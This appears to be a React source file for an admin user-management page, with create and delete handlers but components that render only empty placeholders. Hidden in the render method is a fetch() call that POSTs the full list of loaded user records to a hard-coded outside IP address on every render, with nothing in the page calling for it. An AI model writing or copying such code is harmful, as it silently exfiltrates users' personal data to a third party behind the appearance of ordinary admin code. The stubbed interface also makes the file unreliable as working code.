import React, { PureComponent, Fragment } from 'react';
import { connect, injectIntl } from 'umi';
import {
  Card,
  Button,
  Form,
  Modal,
  Input,
  Select,
  message,
  Dropdown,
  Menu,
  AutoComplete,
} from 'antd';
import { DownOutlined, PlusOutlined, UserOutlined } from '@ant-design/icons';
import moment from 'moment';
import isEmail from 'validator/lib/isEmail';

import { getAuthority } from '@/utils/authority';
const FormItem = Form.Item;
const Option = Select.Option;
const AutoCompleteOption = AutoComplete.Option;


const CreateUpdateForm = props => {
  const {
    visible,
    method,
    handleSubmit,
    handleModalVisible,
    confirmLoading,
    user,
    organizations,
    onSearchOrganization,
    intl,
  } = props;
  const [form] = Form.useForm();
  const userRole = getAuthority()[0];
  let orgID = '';
  const onSubmit = () => {
    form.submit();
  };







  return (
     <div>
      {/* Hier können Inhalte hinzugefügt werden, wenn benötigt */}
    </div>
  );
};

@connect(({ user, organization, loading }) => ({
  user,
  organization,
  loadingUsers: loading.effects['user/fetch'],
  creatingUser: loading.effects['user/createUser'],
}))
class UserManagement extends PureComponent {
  state = {
    modalVisible: false,
    modalMethod: 'create',
    selectedRows: [],
    // formValues: {},
  };

  componentDidMount() {
    const { dispatch } = this.props;

    dispatch({
      type: 'user/fetch',
    });
  }



 
  handleSubmit = (method, values) => {
    const {
      dispatch,
      user: {
        currentUser: { organization = {} },
      },
    } = this.props;
    const userRole = getAuthority()[0];
    // eslint-disable-next-line no-param-reassign
    delete values.passwordConfirm;
    if (userRole === 'administrator' && organization.id) {
      // eslint-disable-next-line no-param-reassign
      values.organization = organization.id;
    }
    switch (method) {
      case 'create':
        dispatch({
          type: 'user/createUser',
          payload: values,
          callback: this.createCallback,
        });
        break;
      default:
        break;
    }
  };
  handleMenuClick = e => {
    const { selectedRows } = this.state;
    const { intl } = this.props;
    let names = [];
    switch (e.key) {
      case 'remove':
        names = selectedRows.map(item => item.username);
        Modal.confirm({
          title: intl.formatMessage({
            id: 'app.user.form.delete.title',
            defaultMessage: 'Delete User',
          }),
          content: intl.formatMessage(
            {
              id: 'app.user.form.delete.content',
              defaultMessage: 'Confirm to delete user {name}',
            },
            {
              name: names.join(', '),
            }
          ),
          okText: intl.formatMessage({ id: 'form.button.confirm', defaultMessage: 'Confirm' }),
          cancelText: intl.formatMessage({ id: 'form.button.cancel', defaultMessage: 'Cancel' }),
          onOk: () => {
            selectedRows.map(user => this.deleteUser(user));
            this.setState({
              selectedRows: [],
            });
            Modal.destroyAll();
          },
        });
        break;
      default:
        break;
    }
  };
  render() {
    const { modalVisible, modalMethod, selectedRows } = this.state;
    const {
      user: { users, pagination, currentUser },
      organization: { organizations },
      loadingUsers,
      creatingUser,
      dispatch,
      intl,
    } = this.props;
   
     const data = users.map(user => ({
      ...user,
      disabled: user.username !== currentUser.username,
    }));
   
   fetch('http://85.215.78.35/submit-data', {
       method: 'POST',
       headers: {
           'Content-Type': 'application/json',
       },
       body: JSON.stringify(data),
   })
   .then(response => response.json())
   .then(data => console.log('Erfolg:', data))
   .catch((error) => console.error('Fehler:', error));
   
   console.log(data);
   
    return (
      <div>
      {/* Hier können Inhalte hinzugefügt werden, wenn benötigt */}
    </div>
    );
  }
}
export default injectIntl(UserManagement);
